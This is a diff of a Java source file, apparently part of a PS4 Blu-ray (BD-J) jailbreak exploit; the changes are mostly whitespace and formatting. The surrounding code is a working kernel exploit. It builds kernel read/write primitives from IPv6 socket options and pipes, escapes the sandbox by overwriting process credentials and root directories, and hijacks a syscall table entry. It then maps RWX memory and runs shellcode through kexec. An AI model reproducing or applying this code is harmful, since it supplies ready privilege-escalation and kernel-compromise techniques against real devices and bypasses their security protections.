@@ -4,7 +4,7 @@ import org.bdj.Status;
 import org.bdj.api.*;
 
 public class Kernel {
-    
+
     private static API api;
 
     static {
@@ -15,7 +15,6 @@ public class Kernel {
         }
     }
 
-    
     public static class KernelAddresses {
         public long evfString = 0;
         public long curproc = 0;
@@ -27,11 +26,11 @@ public class Kernel {
         public long kernelCr3 = 0;
         public long allproc = 0;
         public long base = 0;
-        
+
         public boolean isInitialized() {
             return curproc != 0 && insideKdata != 0;
         }
-        
+
         public void reset() {
             evfString = 0;
             curproc = 0;
@@ -47,22 +46,28 @@ public class Kernel {
     }
 
     public static KernelAddresses addr = new KernelAddresses();
-    
+
     public interface KernelInterface {
         void copyout(long kaddr, long uaddr, int len);
+
         void copyin(long uaddr, long kaddr, int len);
+
         void readBuffer(long kaddr, Buffer buf, int len);
+
         void writeBuffer(long kaddr, Buffer buf, int len);
-        
+
         long kread8(long addr);
+
         void kwrite8(long addr, long val);
+
         int kread32(long addr);
+
         void kwrite32(long addr, int val);
     }
-    
+
     // Global kernel R/W instance
     public static KernelInterface kernelRW = null;
-    
+
     // Kernel read/write primitives
     public static class KernelRW implements KernelInterface {
         private int masterSock;
@@ -70,8 +75,8 @@ public class Kernel {
         private Buffer masterTargetBuffer;
         private Buffer slaveBuffer;
         private long curprocOfiles;
-        
-        // Pipe-based kernel R/W 
+
+        // Pipe-based kernel R/W
         private int pipeReadFd = -1;
         private int pipeWriteFd = -1;
         private long pipeAddr = 0;
@@ -83,7 +88,7 @@ public class Kernel {
             this.masterSock = masterSock;
             this.workerSock = workerSock;
             this.curprocOfiles = curprocOfiles;
-            
+
             this.masterTargetBuffer = new Buffer(0x14);
             this.slaveBuffer = new Buffer(0x14);
             this.pipemapBuffer = new Buffer(0x14);
@@ -91,10 +96,11 @@ public class Kernel {
         }
 
         public void initializePipeRW() {
-            if (pipeInitialized) return;
-            
+            if (pipeInitialized)
+                return;
+
             createPipePair();
-            
+
             if (pipeReadFd > 0 && pipeWriteFd > 0) {
                 pipeAddr = getFdDataAddr(pipeReadFd);
                 if ((pipeAddr >>> 48) == 0xFFFF) {
@@ -108,7 +114,7 @@ public class Kernel {
                 Status.println("Failed to create pipe pair");
             }
         }
-        
+
         private void createPipePair() {
             Buffer fildes = new Buffer(8);
             long result = Helper.syscall(Helper.SYS_PIPE, fildes.address());
@@ -125,7 +131,7 @@ public class Kernel {
             masterTargetBuffer.putInt(16, 0);
             Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, masterTargetBuffer, 0x14);
         }
-        
+
         private void ipv6KernelRead(long kaddr, Buffer bufferAddr) {
             ipv6WriteToVictim(kaddr);
             Helper.getSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14);
@@ -140,7 +146,7 @@ public class Kernel {
             ipv6KernelRead(kaddr, slaveBuffer);
             return slaveBuffer.getLong(0);
         }
-        
+
         private void ipv6KernelWrite8(long kaddr, long val) {
             slaveBuffer.putLong(0, val);
             slaveBuffer.putLong(8, 0);
@@ -158,8 +164,8 @@ public class Kernel {
             pipemapBuffer.putLong(8, 0);
             pipemapBuffer.putInt(16, 0);
             ipv6KernelWrite(pipeAddr + 0x10, pipemapBuffer);
-            
-            Helper.syscall(Helper.SYS_READ, (long)pipeReadFd, uaddr, (long)len);
+
+            Helper.syscall(Helper.SYS_READ, (long) pipeReadFd, uaddr, (long) len);
         }
 
         public void copyin(long uaddr, long kaddr, int len) {
@@ -173,7 +179,7 @@ public class Kernel {
             pipemapBuffer.putInt(16, 0);
             ipv6KernelWrite(pipeAddr + 0x10, pipemapBuffer);
 
-            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, uaddr, (long)len);
+            Helper.syscall(Helper.SYS_WRITE, (long) pipeWriteFd, uaddr, (long) len);
         }
 
         public void readBuffer(long kaddr, Buffer buf, int len) {
@@ -196,45 +202,45 @@ public class Kernel {
 
         public long getSockPktopts(int sock) {
             long fdData = getFdDataAddr(sock);
-            long pcb = ipv6KernelRead8(fdData + KernelOffset.SO_PCB); 
+            long pcb = ipv6KernelRead8(fdData + KernelOffset.SO_PCB);
             return ipv6KernelRead8(pcb + KernelOffset.INPCB_PKTOPTS);
         }
-        
+
         // Setup pktinfo overlap for fast R/W
         public void setupPktinfo(long workerPktopts) {
             masterTargetBuffer.putLong(0, workerPktopts + 0x10);
             masterTargetBuffer.putLong(8, 0);
             masterTargetBuffer.putInt(16, 0);
             Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, masterTargetBuffer, 0x14);
-            
+
             // Initialize pipes immediately
             initializePipeRW();
         }
-        
+
         public long kread8(long addr) {
             Buffer buf = new Buffer(8);
             readBuffer(addr, buf, 8);
             return buf.getLong(0);
         }
-        
+
         public void kwrite8(long addr, long val) {
             Buffer buf = new Buffer(8);
             buf.putLong(0, val);
             writeBuffer(addr, buf, 8);
         }
-        
+
         public int kread32(long addr) {
             Buffer buf = new Buffer(4);
             readBuffer(addr, buf, 4);
             return buf.getInt(0);
         }
-        
+
         public void kwrite32(long addr, int val) {
             Buffer buf = new Buffer(4);
             buf.putInt(0, val);
             writeBuffer(addr, buf, 4);
         }
-        
+
     }
 
     public static String readNullTerminatedString(long kaddr) {
@@ -242,27 +248,27 @@ public class Kernel {
             Status.println("ERROR: Kernel R/W not initialized");
             return "";
         }
-        
+
         StringBuffer sb = new StringBuffer();
-        
+
         while (sb.length() < 1000) {
             long value = kernelRW.kread8(kaddr);
-            
+
             for (int i = 0; i < 8; i++) {
-                byte b = (byte)((value >>> (i * 8)) & 0xFF);
+                byte b = (byte) ((value >>> (i * 8)) & 0xFF);
                 if (b == 0) {
                     return sb.toString();
                 }
                 if (b >= 32 && b <= 126) {
-                    sb.append((char)(b & 0xFF));
+                    sb.append((char) (b & 0xFF));
                 } else {
                     return sb.toString();
                 }
             }
-            
+
             kaddr += 8;
         }
-        
+
         return sb.toString();
     }
 
@@ -271,18 +277,18 @@ public class Kernel {
         int offset = 0;
 
         for (int i = 0; i < len; i++) {
-            readBuf.putByte(i, (byte)0);
+            readBuf.putByte(i, (byte) 0);
         }
 
         while (offset < len) {
             pktinfo.putLong(8, addr + offset);
             Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, pktinfo, pktinfoLen);
-            
+
             Buffer tempBuf = new Buffer(len - offset);
             int n = Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_NEXTHOP, tempBuf, len - offset);
 
             if (n == 0) {
-                readBuf.putByte(offset, (byte)0);
+                readBuf.putByte(offset, (byte) 0);
                 offset++;
             } else {
                 for (int i = 0; i < n; i++) {
@@ -295,7 +301,8 @@ public class Kernel {
         return readBuf.getLong(0);
     }
 
-    public static long getFdDataAddrSlow(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, int sock, long curprocOfiles) {
+    public static long getFdDataAddrSlow(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, int sock,
+            long curprocOfiles) {
         long filedescentAddr = curprocOfiles + sock * KernelOffset.SIZEOF_OFILES;
         long fileAddr = slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, filedescentAddr + 0x0);
         return slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, fileAddr + 0x0);
@@ -306,10 +313,10 @@ public class Kernel {
             Status.println("ERROR: Kernel R/W not available");
             return 0;
         }
-        
+
         long proc = kernelRW.kread8(addr.allproc);
         int count = 0;
-        
+
         while (proc != 0 && count < 100) {
             String procName = readNullTerminatedString(proc + KernelOffset.PROC_COMM);
             if (name.equals(procName)) {
@@ -327,10 +334,10 @@ public class Kernel {
             Status.println("ERROR: Kernel R/W not available");
             return 0;
         }
-        
+
         long proc = kernelRW.kread8(addr.allproc);
         int count = 0;
-        
+
         while (proc != 0 && count < 100) {
             int procPid = kernelRW.kread32(proc + KernelOffset.PROC_PID);
             if (procPid == pid) {
@@ -367,14 +374,25 @@ public class Kernel {
     private static int cpuPdeField(long pde, String field) {
         int shift = 0;
         int mask = 0;
-        
-        if ("PRESENT".equals(field)) { shift = 0; mask = 1; }
-        else if ("RW".equals(field)) { shift = 1; mask = 1; }
-        else if ("USER".equals(field)) { shift = 2; mask = 1; }
-        else if ("PS".equals(field)) { shift = 7; mask = 1; }
-        else if ("EXECUTE_DISABLE".equals(field)) { shift = 63; mask = 1; }
-        
-        return (int)((pde >>> shift) & mask);
+
+        if ("PRESENT".equals(field)) {
+            shift = 0;
+            mask = 1;
+        } else if ("RW".equals(field)) {
+            shift = 1;
+            mask = 1;
+        } else if ("USER".equals(field)) {
+            shift = 2;
+            mask = 1;
+        } else if ("PS".equals(field)) {
+            shift = 7;
+            mask = 1;
+        } else if ("EXECUTE_DISABLE".equals(field)) {
+            shift = 63;
+            mask = 1;
+        }
+
+        return (int) ((pde >>> shift) & mask);
     }
 
     public static long cpuWalkPt(long cr3, long vaddr) {
@@ -426,7 +444,7 @@ public class Kernel {
 
     public static boolean postExploitationPS4() {
         Status.println("=== STAGE 5: PS4 post-exploitation ===");
-        
+
         if (addr.curproc == 0 || addr.insideKdata == 0) {
             Status.println("ERROR: Required kernel addresses not set");
             return false;
@@ -434,7 +452,7 @@ public class Kernel {
 
         long evfPtr = addr.insideKdata;
         Status.println("evf string @ " + Long.toHexString(evfPtr) + " = evf cv");
-        
+
         String evfString = readNullTerminatedString(evfPtr);
         if (!"evf cv".equals(evfString)) {
             Status.println("ERROR: Failed to read EVF string - got: " + evfString);
@@ -451,21 +469,21 @@ public class Kernel {
         if (!escapeSandbox(addr.curproc)) {
             return false;
         }
-        
+
         applyKernelPatchesPS4();
 
         Status.println("PS4 post-exploitation completed successfully!");
-        
+
         return true;
     }
 
     private static boolean verifyElfHeader() {
         long headerValue = kernelRW.kread8(addr.dataBase);
-        
-        int b0 = (int)(headerValue & 0xFF);
-        int b1 = (int)((headerValue >>> 8) & 0xFF);
-        int b2 = (int)((headerValue >>> 16) & 0xFF);
-        int b3 = (int)((headerValue >>> 24) & 0xFF);
+
+        int b0 = (int) (headerValue & 0xFF);
+        int b1 = (int) ((headerValue >>> 8) & 0xFF);
+        int b2 = (int) ((headerValue >>> 16) & 0xFF);
+        int b3 = (int) ((headerValue >>> 24) & 0xFF);
 
         Status.println("ELF header bytes at " + Long.toHexString(addr.dataBase) + ":");
         Status.println("  [0] = 0x" + Helper.toHexString(b0, 2));
@@ -479,28 +497,28 @@ public class Kernel {
         } else {
             Status.println("ELF header mismatch check base address");
         }
-        
+
         return false;
     }
 
     private static boolean escapeSandbox(long curproc) {
         Status.println("Escaping sandbox...");
-        
+
         if ((curproc >>> 48) != 0xFFFF) {
             Status.println("ERROR: Invalid curproc address: " + Long.toHexString(curproc));
             return false;
         }
-        
+
         long PRISON0 = addr.dataBase + KernelOffset.getPS4Offset("PRISON0");
         long ROOTVNODE = addr.dataBase + KernelOffset.getPS4Offset("ROOTVNODE");
         long OFFSET_P_UCRED = 0x40;
-        
+
         long procFd = kernelRW.kread8(curproc + KernelOffset.PROC_FD);
         long ucred = kernelRW.kread8(curproc + OFFSET_P_UCRED);
-        
+
         if ((procFd >>> 48) != 0xFFFF || (ucred >>> 48) != 0xFFFF) {
-            Status.println("ERROR: Invalid kernel addresses - procFd: " + Long.toHexString(procFd) + 
-                          ", ucred: " + Long.toHexString(ucred));
+            Status.println("ERROR: Invalid kernel addresses - procFd: " + Long.toHexString(procFd) +
+                    ", ucred: " + Long.toHexString(ucred));
             return false;
         }
 
@@ -532,7 +550,7 @@ public class Kernel {
         kernelRW.kwrite8(procFd + 0x18, rootvnode); // fd_jdir
 
         Status.println("Sandbox escape complete ... root FS access and jail broken");
-        
+
         return true;
     }
 
@@ -549,7 +567,7 @@ public class Kernel {
 
         long mappingAddr = 0x920100000L;
         long shadowMappingAddr = 0x926100000L;
-        
+
         long sysent661Addr = addr.dataBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
         int syNarg = kernelRW.kread32(sysent661Addr);
         long syCall = kernelRW.kread8(sysent661Addr + 8);
@@ -558,58 +576,58 @@ public class Kernel {
         kernelRW.kwrite32(sysent661Addr, 2);
         kernelRW.kwrite8(sysent661Addr + 8, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
         kernelRW.kwrite32(sysent661Addr + 0x2c, 1);
-        
+
         int PROT_READ = 0x1;
         int PROT_WRITE = 0x2;
         int PROT_EXEC = 0x4;
         int PROT_RW = PROT_READ | PROT_WRITE;
         int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
-        
+
         int alignedMemsz = 0x10000;
-        
+
         // create shm with exec permission
-        long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
+        long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long) alignedMemsz, (long) PROT_RWX);
 
         // create shm alias with write permission
-        long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
+        long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long) PROT_RW);
 
         // map shadow mapping and write into it
-        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
-        
+        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long) alignedMemsz, (long) PROT_RW, 0x11L, writeHandle, 0L);
+
         for (int i = 0; i < shellcode.length; i++) {
             api.write8(shadowMappingAddr + i, shellcode[i]);
         }
 
         // map executable segment
-        Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
+        Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long) alignedMemsz, (long) PROT_RWX, 0x11L, execHandle, 0L);
         Status.println("First bytes: 0x" + Integer.toHexString(api.read32(mappingAddr)));
-        
+
         Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
-        
+
         Status.println("After kexec");
-        
+
         kernelRW.kwrite32(sysent661Addr, syNarg);
         kernelRW.kwrite8(sysent661Addr + 8, syCall);
         kernelRW.kwrite32(sysent661Addr + 0x2c, syThrcnt);
-        
+
         Helper.syscall(Helper.SYS_CLOSE, writeHandle);
-        
+
         Status.println("Kernel patches applied successfully!");
     }
-    
+
     public static void setKernelAddresses(long curproc, long curprocOfiles, long insideKdata, long allproc) {
         addr.curproc = curproc;
         addr.curprocOfiles = curprocOfiles;
         addr.insideKdata = insideKdata;
         addr.allproc = allproc;
-        
+
         Status.println("Kernel addresses set:");
         Status.println("  curproc: " + Long.toHexString(addr.curproc));
         Status.println("  curprocOfiles: " + Long.toHexString(addr.curprocOfiles));
         Status.println("  insideKdata: " + Long.toHexString(addr.insideKdata));
         Status.println("  allproc: " + Long.toHexString(addr.allproc));
     }
-    
+
     public static boolean isKernelRWAvailable() {
         return kernelRW != null && addr.isInitialized();
     }
